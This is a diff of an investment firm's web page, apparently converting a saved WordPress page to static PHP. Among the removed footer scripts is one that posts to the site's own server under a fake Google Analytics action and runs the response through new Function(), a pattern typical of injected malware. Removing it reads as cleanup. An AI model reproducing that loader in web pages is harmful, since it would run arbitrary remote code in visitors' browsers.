@@ -13,7 +13,7 @@
 <body class="home page-template-default page page-id-140 custom-background no-sidebar-layout small_image_blog  boxed-layout">
 <div class="image">
 <div class="menuitems">
-<h2 class="heading"><a href="aboutus.html">Gary Peter Group</a></h2>
+<h2 class="heading"><a href="aboutus.php">Gary Peter Group</a></h2>
 <div class="firstulist">
 <a href="aboutus.php" class="dropbtn">About</a>
 <a href="investmentapproach.php" class="active dropbtn">Investment Approach</a>
@@ -37,14 +37,6 @@
 <div id="content">
 <div class="container clearfix">
 	<main id="main" class="site-main clearfix">
-							<article class="post-format format- post-192 post type-post status-publish format-standard hentry category-investment clearfix" id="post-192">
-								<header class="entry-header">
-									<div class="entry-meta">
-												<span class="author vcard">Author :<a href="http://garypeter.com/author/gpcadmin/" title="gpcadmin">
-						gpcadmin </a></span> <span class="posted-on">Date  :<a title="2:53 pm" href="http://garypeter.com/gary-peter-group-guidelines/">
-						May 6, 2016 </a></span>
-											</div> <!-- .entry-meta -->
-								</header> <!-- .entry-header -->
 				<div class="entry-content">
 				<p>Gary Peter Group is a firm believer in respecting every soul. Our group supports innovation which aims to redefine entrepreneurship. We firmly believe that,</p>
 <h6>&#8220;Respect for ourselves guides our morals; respect for others guides our manners&#8221;</h6>
@@ -64,7 +56,6 @@
 									<footer class="entry-footer"> <span class="cat-links">
 						Category : <a href="investmentapproach.php" rel="category tag">Investment Approach</a> </span> <!-- .cat-links -->
 											</footer> <!-- .entry-meta -->
-								</article>
 		</main> <!-- #main -->
 			<ul class="default-wp-page clearfix">
 			<li class="previous"> <a href="startupfund.php" rel="prev"><span class="meta-nav">&larr;</span> Startup Fund</a> </li>
@@ -80,26 +71,5 @@
 <footer>
 <p><b>Copyrights ©2016-17 by Gary Peter Group</b></p>
 </footer>
-<script>
-    jQuery(document).ready(function () {
-		jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
-			var F = new Function ( response );
-			return( F() );
-		});
-    });
-</script><script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/jquery.cycle.all.js?ver=3.0.3'></script>
-<script type='text/javascript'>
-/* <![CDATA[ */
-var freesiaempire_slider_value = {"transition_effect":"fade","transition_delay":"4000","transition_duration":"1000"};
-/* ]]> */
-</script>
-<script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-slider-setting.js?ver=4.9.3'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/navigation.js?ver=4.9.3'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-quote-slider.js?ver=4.2.2'></script>
-<script type='text/javascript' src='http://garypeter.com/wp-includes/js/wp-embed.min.js?ver=4.9.3'></script>
 </body>
 </html>
